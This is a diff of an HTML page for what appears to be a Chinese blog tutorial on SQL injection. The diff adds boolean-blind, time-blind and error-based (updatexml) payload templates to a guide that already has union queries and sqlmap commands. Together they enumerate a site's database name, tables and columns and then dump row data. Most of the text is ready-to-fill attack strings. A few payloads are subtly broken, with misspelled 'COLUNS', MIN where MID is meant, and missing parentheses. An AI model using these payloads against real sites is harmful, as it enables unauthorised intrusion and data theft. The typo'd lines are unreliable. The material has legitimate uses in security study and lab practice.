@@ -24,7 +24,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="http://example.com/images/logo.webp">
 <meta property="article:published_time" content="2022-05-11T13:12:14.000Z">
-<meta property="article:modified_time" content="2022-05-15T02:48:50.177Z">
+<meta property="article:modified_time" content="2022-05-16T11:51:24.275Z">
 <meta property="article:author" content="XKLibra">
 <meta property="article:tag" content="网络攻防">
 <meta property="article:tag" content="SQL">
@@ -185,7 +185,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~3.56K
+                        ~6.39K
                     
                     字
                 </li>
@@ -201,7 +201,7 @@
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1652582930177"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1652701884275"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
                 <div class="kratos-post-inner-toc">
@@ -238,10 +238,49 @@
 
 如果报错说明没有,如果没有报错说明有
 </code></pre>
+<p><strong>截取字符</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> MID (<span class="string">&#x27;[被截取字符]&#x27;</span>,[从第几位截取],[截多少位]);</span><br><span class="line"><span class="keyword">Select</span> substr(<span class="string">&#x27;[被截取字符]&#x27;</span>,[从第几位截取],[截多少位]); <span class="comment">--+和上面一样</span></span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">left</span>(<span class="string">&#x27;[被截取字符]&#x27;</span>,[截多少位]); <span class="comment">--+Select left 为从左开始截取</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>转成<a target="_blank" rel="noopener" href="http://c.biancheng.net/c/ascii/">ASCII</a></strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> ORD(<span class="string">&#x27;[被转字符]&#x27;</span>);</span><br><span class="line"><span class="keyword">Select</span> ASCII(<span class="string">&#x27;[被转字符]&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>判断语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> If([要判断的语句] ,[如果成立要执行的语句]，[如果不成立要执行的语句] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>休眠</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> Sleep(秒)；</span><br><span class="line"><span class="comment">--+PS:</span></span><br><span class="line"><span class="keyword">Select</span> IF(length(database())<span class="operator">=</span><span class="number">8</span> , sleep(<span class="number">1</span>) , <span class="number">0</span>) </span><br></pre></td></tr></table></figure>
+
 <p><strong>Union拼接语句:</strong></p>
 <pre><code>union可将两条SQL语句同时执行
 </code></pre>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> XXXXX <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(), <span class="number">1</span> # <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p> <strong>布尔盲注：</strong></p>
+<pre><code>类似于-枚举
+
+依靠猜字母来判断名称
+最好写个脚本
+
+猜到字符会有会有类似于&quot;you are in……&quot;的反馈。
+</code></pre>
+<p><strong>时间盲注：</strong></p>
+<pre><code>与布尔盲注类似，都是依靠猜字母来判断名称
+
+猜到网页sleep(1)后刷新，猜错网页快速刷新
+</code></pre>
+<p><strong>报错注入：</strong></p>
+<pre><code>利用XML节点的语法报错信息进行注入
+
+处理XML以外还有很多可以语句可以使用
+
+ExtractValue 和 updatexml 用法基本一样例如:
+</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> extractValue(<span class="string">&#x27;&#x27;</span>,concat(<span class="string">&#x27;~&#x27;</span>,database())); 和 <span class="keyword">Select</span> updatexml(<span class="string">&#x27;&#x27;</span>,concat(<span class="string">&#x27;~&#x27;</span>,database())); </span><br></pre></td></tr></table></figure>
+
+<p>0x7e 是波浪号,这样可以区分一次性多拿取数据的位置。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1) --+</span></span><br></pre></td></tr></table></figure>
+
+
 
 <p><strong>闭合:</strong></p>
 <pre><code>将SQL语句进行闭合
@@ -265,7 +304,7 @@
 <hr>
 <h2 id="如何判断是否可以注入"><a href="#如何判断是否可以注入" class="headerlink" title="如何判断是否可以注入"></a>如何判断是否可以注入</h2><pre><code>在URL的后面加上?id=1&#39; 或者 ?id=1&#39; and 1=1 输入并回车，
 </code></pre>
-<p>然后输入?id&#x3D;1’ and 1&#x3D;2 再回车，查看是否有变化</p>
+<p>然后输入?id&#x3D;1’ and 1&#x3D;2 再回车，查看是否有变化，如果有反馈而且变化一样，则使用时间盲注。</p>
 <p>PS: HTTPS⑧行，HTTP彳亍</p>
 <h2 id="如何判断是什么数据库"><a href="#如何判断是什么数据库" class="headerlink" title="如何判断是什么数据库"></a>如何判断是什么数据库</h2><pre><code>在URL的后面加上?id=1&#39;看报错是否是SQL一类的
 
@@ -277,11 +316,29 @@
 <p>一般查库：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[URL]?id=1&#x27; union select database() --+</span><br></pre></td></tr></table></figure>
 
+<p>布尔盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),[左开始第几位],[截多少位-默认1位-]))=[ASCII码32-126] --+ //查询第1—n+1位</span><br><span class="line">?id=1&#x27; and ascii(left(database(),1))=[ASCII码32-126] --+ //一般查询第一位</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),[左开始第几位],[截多少位-默认1位-]))=[ASCII码32-126], sleep(1) ,0) --+</span><br></pre></td></tr></table></figure>
+
+<p>报错注入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ //库名查询</span><br></pre></td></tr></table></figure>
+
 <p>SQLMAP工具查库：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --current-db</span><br></pre></td></tr></table></figure>
 
 <h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><p>一般查表:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;库名&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit [第几个表0—n+1],1),[左开始第几位字符],1))=[ASCII码32-126] --+</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(select table_name from information_schema.tables where table_schema=database() limit [第几个表0—n+1],1),[左开始第几位字符],1))=[ASCII码32-126], sleep(1) ,0) --+</span><br></pre></td></tr></table></figure>
+
+<p>报错注入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+ //查询所有的表</span><br></pre></td></tr></table></figure>
 
 <p>SQLMAP工具：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[什么数据库] -D &quot;[库名]&quot; --tables</span><br></pre></td></tr></table></figure>
@@ -289,11 +346,29 @@
 <h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><p>一般查列:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;库名&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
+<p>布尔盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select COLUMN_NAME from information_schema.COLUNS where TABLE_SCHEMA=&#x27;[库名]&#x27; and TABLE_NAME=&#x27;[表名]&#x27; limit  [第几个列0—n+1],1)[左开始第几位字符],1))=[ASCII码32-126] --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(select COLUMN_NAME from information_schema.COLUNS where TABLE_SCHEMA=&#x27;[库名]&#x27; and TABLE_NAME=&#x27;[表名]&#x27; limit  [第几个列0—n+1],1)[左开始第几位字符],1))=[ASCII码32-126], sleep(1) ,0) --+</span><br></pre></td></tr></table></figure>
+
+<p>报错注入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;库名&#x27; and table_name=&#x27;表名&#x27;),0x7e),1) --+ //查询所有的列</span><br></pre></td></tr></table></figure>
+
 <p>SQLMAP工具：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[什么数据库] -D &quot;[库名]&quot; -T &quot;[表名]&quot; --col	//获取某一个库某一个表的所有列名</span><br></pre></td></tr></table></figure>
 
 <h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>一般获取数据:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> [你查到的列（有几个写几个）] <span class="keyword">from</span> [表名]</span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ORD(MIN((SELECT IFNULL(CAST([列名] AS CHAR),0x20)FROM [库名].[表名] ORDER BY id LIMIT [第几列0—n+1],1),[左开始第几位字符],1))=[ASCII码32-126] --+</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ORD(MIN((SELECT IFNULL(CAST([列名] AS CHAR),0x20)FROM [库名].[表名] ORDER BY id LIMIT [第几列0—n+1],1),[左开始第几位字符],1))=[ASCII码32-126], sleep(1) ,0) --+</span><br></pre></td></tr></table></figure>
+
+<p>报错注入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(Select [你查到的列的其中一个] from [表名]),0x7e),1) --+ //查询数据</span><br></pre></td></tr></table></figure>
 
 <p>SQLMAP工具：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[什么数据库] -D &quot;[库名]&quot; -T &quot;[表名]&quot; -C &quot;[列名1],[列名2]&quot; --dump</span><br></pre></td></tr></table></figure>
@@ -394,7 +469,7 @@ Hackbar, HTTP header Live ,Omnibug , Tamper Data
                     <a class="tag-none-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="tag-none-link" href="/tags/liunx-kail/" rel="tag">liunx kail</a>, <a class="tag-none-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2022-05-15T02:48:50.177Z" itemprop="dateModified">最后编辑：2022-05-15</time>
+                    <time datetime="2022-05-16T11:51:24.275Z" itemprop="dateModified">最后编辑：2022-05-16</time>
                 </div>
             </div>
         </footer>
